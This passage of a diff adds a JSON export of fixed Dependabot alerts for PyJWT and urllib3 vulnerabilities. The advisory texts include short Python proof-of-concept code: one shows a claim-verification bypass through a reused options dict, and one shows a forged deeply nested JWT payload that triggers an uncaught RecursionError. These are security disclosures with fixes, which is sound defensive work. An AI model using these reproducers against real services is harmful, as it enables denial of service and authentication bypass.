+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/releases/tag/2.15.0"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-x33g-cr3x-6449"
+          }
+        ],
+        "published_at": "2026-10-05T23:44:03Z",
+        "updated_at": "2026-10-05T23:44:05Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "PyJWT"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 2.1.0, <= 2.14.0",
+            "first_patched_version": {
+              "identifier": "2.15.0"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N",
+            "score": 6.5
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "epss": {
+          "percentage": 0.00143,
+          "percentile": 0.03085
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N",
+          "score": 6.5
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-345",
+            "name": "Insufficient Verification of Data Authenticity"
+          },
+          {
+            "cwe_id": "CWE-348",
+            "name": "Use of Less Trusted Source"
+          }
+        ],
+        "classification": "general"
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "PyJWT"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": ">= 2.1.0, <= 2.14.0",
+        "first_patched_version": {
+          "identifier": "2.15.0"
+        }
+      },
+      "url": "https://api.github.com/repos/unified-systems-com/tap/dependabot/alerts/48",
+      "html_url": "https://github.com/unified-systems-com/tap/security/dependabot/48",
+      "created_at": "2026-10-07T14:02:27Z",
+      "updated_at": "2026-10-07T15:38:42Z",
+      "dismissal_request": null,
+      "assignees": [],
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": "2026-10-07T15:38:42Z",
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 47,
+      "state": "fixed",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "PyJWT"
+        },
+        "manifest_path": "uv.lock",
+        "scope": "runtime",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-gvp8-978c-rx2q",
+        "cve_id": "CVE-2026-103001",
+        "summary": "PyJWT.decode() reintroduces options-dict mutation, enabling silent claim-verification bypass on dict reuse",
+        "description": "### Summary\n\n`PyJWT.decode()`/`decode_complete()` mutates a caller-supplied `options` dict in place whenever `verify_signature` is falsy, adding `verify_exp`/`verify_nbf`/`verify_iat`/`verify_aud`/`verify_iss`/`verify_sub`/`verify_jti` keys directly onto that object. If application code reuses the same `options` dict across calls (a config object, a module-level constant, a wrapper's `self.options`), a later call that explicitly sets `verify_signature=True` for a full, normal verification silently inherits the leftover `verify_exp=False` etc. from an earlier `verify_signature=False` call on the same object -- and accepts an expired, wrong-audience, wrong-issuer, or wrong-subject token as valid with no exception. Signature verification itself is unaffected; this is specifically a claims-check bypass.\n\nThis is a regression of an already-fixed, closed issue: originally reported in #679 (2021), fixed in #743 (2022, via a shallow copy of `options`), and silently reintroduced by #1045 (merged 2025-03-05, a typing/logic refactor that dropped the 2022 shallow-copy line). It has been present since #1045 merged, so it likely shipped in several releases already in the wild.\n\n### Details\n\nFile: `jwt/api_jwt.py`, `PyJWT._merge_options()` (called from `decode_complete()`, which backs both `jwt.decode()` and `jwt.decode_complete()`):\n\n```python\ndef _merge_options(self, options=None):\n    if options is None:\n        return self.options\n    if not options.get(\"verify_signature\", True):\n        options[\"verify_exp\"] = options.get(\"verify_exp\", False)\n        options[\"verify_nbf\"] = options.get(\"verify_nbf\", False)\n        # ...5 more, same pattern -- all written directly onto the caller's dict\n    return {**self.options, **options}\n```\n\nNo `dict(options)` copy occurs before these writes, unlike the pre-2025-03-05 code (see #743's fix, `options = dict(options or {})`). Confirmed via `gh api repos/jpadilla/pyjwt/commits/29fbfc36` that #1045's diff removes that line. Confirmed still present on current `main` via a live fetch of `jwt/api_jwt.py`.\n\n### PoC\n\nTwo scripts, each run twice (separate processes), identical output both times (except Python object `id()`), saved locally and available on request:\n\n```python\nimport jwt, time\n\nINSECURE_OPTIONS = {\"verify_signature\": False}\n\nsecret = \"s3cr3t\"\nexpired_token = jwt.encode(\n    {\"exp\": int(time.time()) - 3600, \"data\": \"x\"}, secret, algorithm=\"HS256\"\n)\n\njwt.decode(expired_token, options=INSECURE_OPTIONS)\nprint(INSECURE_OPTIONS)\n# The dict has been silently mutated with 7 new keys, including verify_exp: False.\n\nINSECURE_OPTIONS[\"verify_signature\"] = True\nresult = jwt.decode(expired_token, secret, algorithms=[\"HS256\"], options=INSECURE_OPTIONS)\nprint(result)\n# No exception raised. Expected: jwt.ExpiredSignatureError, since verify_signature=True\n# was explicitly requested on this call.\n```\n\nReproduced deterministically across 2 independent process runs.\n\n### Impact\n\nPreconditions: the calling application must reuse a mutable `options` dict object across two or more `decode()`/`decode_complete()` calls with different intent (e.g. one \"insecure peek\" call followed by a \"fully verified\" call on the same dict, config object, or instance attribute). This is a real, plausible pattern but not universal; it does not affect code that constructs a fresh `options` dict per call.\n\nWhen triggered: a signed-but-expired (or wrong-aud/iss/sub/jti) token is silently accepted as fully verified, with no warning or exception. This is an authentication/claims-verification bypass, not a signature-verification bypass.\n\nScope: regression present since PR #1045 (merged 2025-03-05), affecting every PyJWT release since then up to and including the current 2.13.0.\n\nSuggested fix: restore a shallow copy inside `_merge_options()` itself (rather than relying on a caller-side copy), so every caller of `_merge_options` is covered:\n\n```python\ndef _merge_options(self, options=None):\n    if options is None:\n        return self.options\n    options = dict(options)  # never mutate the caller's dict\n    if not options.get(\"verify_signature\", True):\n        options.setdefault(\"verify_exp\", False)\n        options.setdefault(\"verify_nbf\", False)\n        options.setdefault(\"verify_iat\", False)\n        options.setdefault(\"verify_aud\", False)\n        options.setdefault(\"verify_iss\", False)\n        options.setdefault(\"verify_sub\", False)\n        options.setdefault(\"verify_jti\", False)\n    return {**self.options, **options}\n```\n\nFound via a property-based audit (copy/clone independence across widely-used Python libraries); both repro scripts were written and independently re-run before this report.\n\n## Maintainer update \u2014 2026-09-08\n\nWe reproduced the reported behavior on PyJWT 2.13.0 at source SHA `7144e4534c34810f4525dc4578a32addd8212cff`. A caller-supplied mutable `options` mapping was modified when `verify_signature` was false; reusing that mapping after re-enabling signature verification could leave registered-claim checks disabled. This is a conditional claim-verification bypass, not a signature-forgery issue.\n\nA narrow fix has been prepared: PyJWT now copies the options mapping before applying defaults. Regression coverage includes `decode()`, `decode_complete()`, constructor input preservation, mutable-mapping compatibility, and reuse of an options mapping across verification modes. The focused tests pass, the full suite passes with 369 tests and 4 intentional cryptography-environment skips, and lint/format/type checks pass.\n\nThe advisory remains in triage while the fix goes through release planning. The independently verified range in this investigation is 2.13.0; reports of earlier affected versions should include the exact version and reproduction details.",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-gvp8-978c-rx2q",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-103001",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-gvp8-978c-rx2q"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/commit/0c87c8c8b1a74cac99ad8115f3050efcb7fbed35"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-gvp8-978c-rx2q"
+          }
+        ],
+        "published_at": "2026-09-30T23:53:17Z",
+        "updated_at": "2026-09-30T23:53:18Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "PyJWT"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 2.11.0, <= 2.13.0",
+            "first_patched_version": null
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N",
+            "score": 6.5
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "epss": {
+          "percentage": 0.00241,
+          "percentile": 0.14079
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N",
+          "score": 6.5
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-471",
+            "name": "Modification of Assumed-Immutable Data (MAID)"
+          }
+        ],
+        "classification": "general"
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "PyJWT"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": ">= 2.11.0, <= 2.13.0",
+        "first_patched_version": null
+      },
+      "url": "https://api.github.com/repos/unified-systems-com/tap/dependabot/alerts/47",
+      "html_url": "https://github.com/unified-systems-com/tap/security/dependabot/47",
+      "created_at": "2026-10-01T03:38:46Z",
+      "updated_at": "2026-10-07T15:38:41Z",
+      "dismissal_request": null,
+      "assignees": [],
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": "2026-10-07T15:38:41Z",
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 46,
+      "state": "fixed",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "PyJWT"
+        },
+        "manifest_path": "uv.lock",
+        "scope": "runtime",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-42vr-xj54-vc7v",
+        "cve_id": "CVE-2026-101918",
+        "summary": "PyJWT: Unauthenticated RecursionError DoS in pre-verification payload parse (PyJWKClient.get_signing_key_from_jwt / verify_signature=False)",
+        "description": "## Summary\n\n`PyJWKClient.get_signing_key_from_jwt(token)` \u2014 the first step of the JWKS\nverification flow documented in `docs/usage.rst` \u2014 must decode a token's\npayload before its signature can be checked, via\n`jwt.api_jwt.decode_complete(token, options={\"verify_signature\": False})`.\nThat call parses the payload with `json.loads` in `PyJWT._decode_payload`\n(`jwt/api_jwt.py:297-300`), whose `except` clause catches only `ValueError`.\nA payload that is valid JSON but nested ~20,000 levels deep makes\n`json.loads` raise `RecursionError`, which is **not** a `ValueError` and\nescapes as a raw, undocumented exception type \u2014 not `DecodeError`,\n`InvalidTokenError`, or `PyJWTError`, so every documented error-handling\npattern in `docs/usage.rst` misses it.\n\nThe token needs no valid signature and no network access \u2014 the crash\nhappens during payload parsing, before the `kid` is even looked up. A\nsingle unauthenticated ~50KB request crashes the caller's auth handler\n(HTTP 500 / dead worker), repeatably. The same path is reachable through\nplain `jwt.decode(token, options={\"verify_signature\": False})` too.\n\nNotably, this project already fixed the **identical** bug class for the\nJWS **header** path \u2014 `PyJWS._load` catches `(ValueError, RecursionError)`\nand wraps it in `DecodeError` (`jwt/api_jws.py:360-361`), and\n`CHANGELOG.rst` (v2.14.0, \"Security\") states \"Handle deeply nested and\nmalformed JWS/JWK input without uncaught recursion errors.\" The payload\npath \u2014 the one part of a forged token an unauthenticated attacker fully\ncontrols \u2014 was left catching `ValueError` alone, so that security fix does\nnot fully hold.\n\nA second, related instance: `PyJWKClient.fetch_data` (`jwt/jwks_client.py:168`)\nparses a JWKS endpoint's response with `json.load(response)` inside a\n`try` that only catches `(URLError, TimeoutError, http.client.HTTPException)`\n\u2014 a deeply-nested JSON response from a JWKS endpoint raises the same raw\n`RecursionError`, uncaught entirely (worse than the payload path, which at\nleast caught plain `ValueError`).\n\n**Affected versions:** confirmed present in the current release, 2.14.0,\nand on the current `master` branch (commit `4adcd02722f5011c60079d3978dfc167b9a8eaa5`).\n\n## Reproduction\n\n```python\nimport base64, json, jwt\n\ndef b64url(b):\n    return base64.urlsafe_b64encode(b).rstrip(b\"=\")\n\nheader = b64url(json.dumps({\"alg\": \"HS256\", \"typ\": \"JWT\"}).encode())\npayload = b64url(b\"[\" * 20_000 + b\"]\" * 20_000)\ntoken = (header + b\".\" + payload + b\".\" + b64url(b\"forged-sig\")).decode()\n\njwt.decode(token, options={\"verify_signature\": False})\n# raises: RecursionError (not DecodeError/InvalidTokenError/PyJWTError)\n```\n\nControl: the same deeply-nested structure moved into the token's **header**\ninstead of its payload is correctly converted to `jwt.DecodeError` by the\nalready-hardened `jwt/api_jws.py:360` \u2014 confirming the payload path is\nspecifically the missed half of the v2.14.0 hardening, not a general gap.\n\n## Impact assessment\n\nUnauthenticated denial-of-service via unhandled exception on an auth path.\nNot an auth bypass \u2014 rated medium. With signature verification enabled,\nthis parse runs after `_verify_signature`, so only the pre-verification\npaths (`get_signing_key_from_jwt`, explicit `verify_signature=False`) are\nattacker-reachable pre-auth; the JWKS-endpoint variant requires control of\n(or a MITM on) the configured JWKS endpoint rather than being reachable\nfrom an arbitrary client token.\n\n## Suggested fix\n\nIn `jwt/api_jwt.py:299`, change `except ValueError as e:` to\n`except (ValueError, RecursionError) as e:`, mirroring\n`jwt/api_jws.py:360` exactly. In `jwt/jwks_client.py`, add the same\n`(ValueError, RecursionError)` handling around `json.load(response)` in\n`fetch_data`, raising `PyJWKClientError` (consistent with the method's\nexisting documented error contract). A patch implementing both, verified\nagainst the full test suite (457 passed, 4 skipped \u2014 pre-existing,\nenvironment-related) and against the reproduction above (now correctly\nraises `DecodeError`), is attached (`fix.patch`).\n\n## Discovery method\n\nFound and verified using `scopegrep` (https://github.com/not-ekalabya/scopegrep)\n\u2014 a semantic code-retrieval tool that surfaces every other call site of a\nsymbol alongside relevance-ranked results, which is what surfaced the\nalready-hardened header path as the direct comparison here \u2014 paired with\nan LLM coding agent (GLM-5.3) run as an open-ended security review of this\nrepository. Independently reproduced against the exact commit above before\nthis report was written. Happy to share the full session transcript on\nrequest.\n\n## Disclosure status\n\nNot shared with any other party or published. Submitting through this\nprivate channel per the project's stated security policy; no planned\npublic/conference disclosure ahead of a coordinated timeline.\n\n\n---\n\n## Maintainer triage update (2026-09-22)\n\n### Confirmed finding and scope\n\nWe confirmed that an attacker-controlled recursively nested JWT payload can cause a raw Python `RecursionError` to escape PyJWT at PyJWT 2.14.0 and the tested current source. The confirmed in-scope paths are direct decoding with `verify_signature=False` and `PyJWKClient.get_signing_key_from_jwt`, where payload parsing occurs before key lookup.\n\nThe demonstrated impact is limited to an uncaught exception for the affected call, which may surface as an application HTTP 500 when the application does not catch it. Testing did not demonstrate a worker or process crash, persistent resource exhaustion, resource amplification, authentication bypass, or confidentiality or integrity impact.\n\nThe separate JWKS-response subclaim is out of scope under the policy boundary that requires the application to trust its configured JWKS source and transport. The confirmed payload finding is not a duplicate of the earlier protected-header parser finding: it occurs in a distinct payload parsing path that remained affected after the earlier header-only fix.\n\n### Version and remediation status\n\nHistorical testing reproduced the confirmed payload behavior in all 20 official supported PyJWT 2.x releases from 2.0.0a1 through 2.14.0, inclusive. Unsupported PyJWT 1.7.1 also reproduces the behavior, but it is excluded from the advisory range under the supported-2.x policy. No supported unaffected release and no patched release exists. The exact evidence is `/Users/jpadilla/.codex/security-advisories/pyjwt/GHSA-42vr-xj54-vc7v-historical-range-20260922.md` (SHA-256 `c48f1ac35641e9382d53e6a879a71ad9a8fb4432bbe871f2b8330f8d166a2d81`) and `/Users/jpadilla/.codex/security-advisories/pyjwt/historical-range-42vr-20260922/historical-range-results.json` (SHA-256 `324997f231561bf6da39b8f9d1e272f69bfde8871a7863f5cb7b70e22e91f076`). The evidence-backed supported affected range is `>= 2.0.0a1, <= 2.14.0`.\n\nHistorical range verification is complete. A local fix commit exists and has passed independent review and the complete local CI suite, but it has not been merged into `master` or released. Consequently, `patched_versions` remains empty and this advisory remains in `triage`. The remaining next step is a maintainer decision on remediation and merge. After a fix lands in `master` and is released, `patched_versions` and advisory lifecycle can be updated in a separate approved batch.\n\n---\n\n## Maintainer remediation update (2026-09-23)\n\nThe confirmed payload-parser finding has been fixed on `master`. Commit\n`5fde08a6cf906aa7698de2d6391d88b73006b17b` converts a recursive\npayload parse failure to the expected `DecodeError`; commit\n`9bc06658f875b9b40091539140bbbdc4639161c3` makes the regression tests\ndeterministic across supported Python versions. This update supersedes the\n2026-09-22 remediation-status statement that the fix had not landed.\n\nThe original pre-verification payload reproducer and the\n`PyJWKClient.get_signing_key_from_jwt` path were covered by regression tests.\nThe exact landed tree passed the full 39-environment local tox matrix and\nGitHub CI for commit `9bc06658f875b9b40091539140bbbdc4639161c3` passed\nall 25 jobs, including Ubuntu Python 3.14 and 3.15. The demonstrated impact\nremains an uncaught request-level exception in affected releases; there is\nstill no evidence of process termination, persistent resource exhaustion,\nauthentication bypass, or confidentiality or integrity impact.\n\nThe supported affected range remains `>= 2.0.0a1, <= 2.14.0`. The latest\nreleased version is 2.14.0, which predates these commits; no released\npatched version exists yet, so `patched_versions` remains unset. CVSS v3.1\n5.3 (Medium) and CWE-248 remain unchanged. The advisory may now move from\ntriage to private draft. The next lifecycle step is a new supported 2.x\nrelease containing the fix, followed by separately approved patched-version\nand publication updates after release verification.\n\n---\n\n## Maintainer release update (2026-09-23)\n\nPyJWT 2.15.0 is the first released version containing the payload-parser fix. Its GitHub release tag points to commit `1d41a6478e1562e68ff667fcd703356acf085f68`, which includes fix commit `5fde08a6cf906aa7698de2d6391d88b73006b17b` and deterministic regression-test commit `9bc06658f875b9b40091539140bbbdc4639161c3`. PyPI published both the wheel and source distribution from that release commit through the successful production workflow at https://github.com/jpadilla/pyjwt/actions/runs/35891602963.\n\nThe published PyPI wheel (`pyjwt-2.15.0-py3-none-any.whl`, SHA-256 `7a3742debf6b879e912dbb9819ceec1594be812452b78c5f2e2dfc56564954f8`) was checked directly: the deeply nested unsigned payload now raises `DecodeError`, while an ordinary unsigned payload still decodes. The supported affected range remains `>= 2.0.0a1, <= 2.14.0`; the patched version is `2.15.0`. Earlier statements in this advisory that no released patched version exists are superseded by this update.\n\nThe confirmed impact remains an uncaught request-level exception in affected versions, not a demonstrated process crash or authentication bypass. The separate JWKS-response subclaim remains outside this advisory's confirmed PyJWT-owned scope.",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-42vr-xj54-vc7v",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-101918",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-42vr-xj54-vc7v"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101918"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/commit/5fde08a6cf906aa7698de2d6391d88b73006b17b"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/releases/tag/2.15.0"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-42vr-xj54-vc7v"
+          }
+        ],
+        "published_at": "2026-09-30T15:41:05Z",
+        "updated_at": "2026-09-30T15:41:07Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "PyJWT"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 2.0.0a1, <= 2.14.0",
+            "first_patched_version": {
+              "identifier": "2.15.0"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "score": 5.3
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "epss": {
+          "percentage": 0.00358,
+          "percentile": 0.27501
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "score": 5.3
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-248",
+            "name": "Uncaught Exception"
+          }
+        ],
+        "classification": "general"
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "PyJWT"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": ">= 2.0.0a1, <= 2.14.0",
+        "first_patched_version": {
+          "identifier": "2.15.0"
+        }
+      },
+      "url": "https://api.github.com/repos/unified-systems-com/tap/dependabot/alerts/46",
+      "html_url": "https://github.com/unified-systems-com/tap/security/dependabot/46",
+      "created_at": "2026-10-01T03:38:46Z",
+      "updated_at": "2026-10-07T15:38:41Z",
+      "dismissal_request": null,
+      "assignees": [],
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": "2026-10-07T15:38:41Z",
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 45,
+      "state": "fixed",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "urllib3"
+        },
+        "manifest_path": "uv.lock",
+        "scope": "runtime",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-gh4c-6fx4-qh6g",
+        "cve_id": "CVE-2026-97688",
+        "summary": "urllib3: Chunked Deflate streaming can enter an infinite loop",
+        "description": "### Impact\n\nurllib3's streaming API is designed for the efficient handling of large HTTP responses by reading content in chunks instead of loading the entire response body into memory at once.\n\nurllib3 can decompress response bodies according to the HTTP `Content-Encoding` header. When streaming a compressed, chunked response, urllib3 first consumes data already buffered by the decoder before reading the next HTTP chunk.\n\nHowever, urllib3 versions from 2.6.2 through 2.7.0 could enter an infinite loop when a chunked response contained bytes after the end of the Deflate stream. If the decompressed body exceeded the requested streaming chunk size, Python's zlib implementation could retain the trailing bytes as unconsumed input after reaching the end of the compressed stream. urllib3 would repeatedly attempt to decode those same bytes without making progress or reading more data from the network.\n\nA malicious server could exploit this behavior to cause excessive CPU usage and prevent the affected request from completing on the client. Network read timeouts would not interrupt the loop because no further socket operation was required.\n\n### Affected usages\n\nApplications and libraries using urllib3 versions 2.6.2 through 2.7.0 may be affected when all of the following conditions are met:\n\n1. Compressed responses from an untrusted source are streamed using `HTTPResponse.stream(amt=N)` or `HTTPResponse.read_chunked(amt=N)` with a positive, finite chunk size.\n2. Content decoding is enabled.\n3. The response uses both `Transfer-Encoding: chunked` and `Content-Encoding: deflate`.\n4. The decoded body exceeds the requested chunk size and the encoded body contains bytes after the end of the Deflate stream.\n\n`HTTPResponse.stream()` uses a finite chunk size by default and is therefore affected when the other conditions are met.\n\n### Remediation\n\nUpgrade to urllib3 2.8.0, in which the Deflate decoder stops accepting input after reaching the end of the compressed stream and no longer reports trailing bytes as data that can produce more decoded output.\n\nIf upgrading is not immediately possible, disable automatic content decoding for responses from untrusted sources by setting `decode_content=False`, or reject streamed responses using the Deflate content encoding. Applications that disable automatic decoding must handle the compressed response safely at another layer.",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-gh4c-6fx4-qh6g",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-97688",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-gh4c-6fx4-qh6g"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-97688"
+          },
+          {
+            "url": "https://github.com/urllib3/urllib3/commit/ea2ad7b21a80da3632f80016526a18864586077f"
+          },
+          {
+            "url": "https://github.com/urllib3/urllib3/releases/tag/2.8.0"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-gh4c-6fx4-qh6g"
+          }
+        ],
+        "published_at": "2026-09-30T15:00:38Z",
+        "updated_at": "2026-09-30T15:00:39Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "urllib3"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 2.6.2, < 2.8.0",
+            "first_patched_version": {
+              "identifier": "2.8.0"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": null,
+            "score": 0.0
+          },
+          "cvss_v4": {
+            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+            "score": 6.9
+          }
+        },
+        "epss": {
+          "percentage": 0.00291,
+          "percentile": 0.19591
+        },
+        "cvss": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-835",
+            "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
+          }
+        ],
+        "classification": "general"
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "urllib3"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": ">= 2.6.2, < 2.8.0",
+        "first_patched_version": {
+          "identifier": "2.8.0"
+        }
+      },
+      "url": "https://api.github.com/repos/unified-systems-com/tap/dependabot/alerts/45",
+      "html_url": "https://github.com/unified-systems-com/tap/security/dependabot/45",
+      "created_at": "2026-10-01T03:38:46Z",
+      "updated_at": "2026-10-01T16:35:50Z",
+      "dismissal_request": null,
+      "assignees": [],
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": "2026-10-01T16:35:50Z",
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 44,
+      "state": "fixed",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "urllib3"
+        },
+        "manifest_path": "uv.lock",
+        "scope": "runtime",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-vxq7-64xx-v4gw",
+        "cve_id": "CVE-2026-97689",
+        "summary": "urllib3: HTTPResponse.stream()/read_chunked() buffers an unbounded chunk-size line into memory",
+        "description": "## Impact\n\nurllib3's [streaming API](https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o) is designed for efficiently handling large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When decoding a [chunked-transfer-encoded response](https://httpwg.org/specs/rfc9112.html#chunked.encoding), this API reads each chunk's size field by buffering until it sees `\\n` or EOF.\n\nA malicious HTTP server can return `Transfer-Encoding: chunked` and then send a very long run of bytes without any newline, causing the streaming client to buffer that entire run before urllib3 can reject the chunk size as invalid and allocate more memory than intended.\n\nTo fix the issue, we'll reject chunk-size fields larger than 65536 bytes, as already done in the non-streaming case, which is currently handled by the Python standard library. Note that this only applies to reading the chunk-size field, not the chunk data, which is already handled correctly. Thus, there shouldn't be any impact for non-malicious servers.\n\n## Affected usages\n\nApplications and libraries using urllib3 versions earlier than 2.8.0 may be affected when streaming a chunked response from untrusted sources. Specifically, this affects the [read_chunked()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read_chunked) and [stream()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.stream) methods of the HTTPResponse object.\n\nThis also affects requests streaming API, which uses urllib3 under the hood.\n\n## Remediation\n\nUpgrade to urllib3 version 2.8.0 or later, where chunk-size fields larger than 65536 will be rejected. If upgrading is not immediately possible, consider reading the response at once using the [read()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read) method.",
+        "severity": "high",
+        "identifiers": [
+          {
+            "value": "GHSA-vxq7-64xx-v4gw",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-97689",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-vxq7-64xx-v4gw"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-97689"
+          },
+          {
+            "url": "https://github.com/urllib3/urllib3/commit/cd770b059b543be29298ea5c52afb0b1b090f5ed"
+          },
+          {
+            "url": "https://github.com/urllib3/urllib3/releases/tag/2.8.0"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-vxq7-64xx-v4gw"
+          }
+        ],
+        "published_at": "2026-09-30T14:46:18Z",
+        "updated_at": "2026-09-30T14:46:20Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "urllib3"
+            },
+            "severity": "high",
+            "vulnerable_version_range": ">= 1.10.3, < 2.8.0",
+            "first_patched_version": {
+              "identifier": "2.8.0"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": null,
+            "score": 0.0
+          },
+          "cvss_v4": {
+            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+            "score": 8.9
+          }
+        },
+        "epss": {
+          "percentage": 0.00292,
+          "percentile": 0.19612
+        },
+        "cvss": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-770",
+            "name": "Allocation of Resources Without Limits or Throttling"
+          }
+        ],
+        "classification": "general"
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "urllib3"
+        },
+        "severity": "high",
+        "vulnerable_version_range": ">= 1.10.3, < 2.8.0",
+        "first_patched_version": {
+          "identifier": "2.8.0"
+        }
+      },
+      "url": "https://api.github.com/repos/unified-systems-com/tap/dependabot/alerts/44",
+      "html_url": "https://github.com/unified-systems-com/tap/security/dependabot/44",
+      "created_at": "2026-10-01T03:38:45Z",
+      "updated_at": "2026-10-01T16:35:50Z",
+      "dismissal_request": null,
+      "assignees": [],
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": "2026-10-01T16:35:50Z",
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 43,
+      "state": "fixed",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "urllib3"
+        },
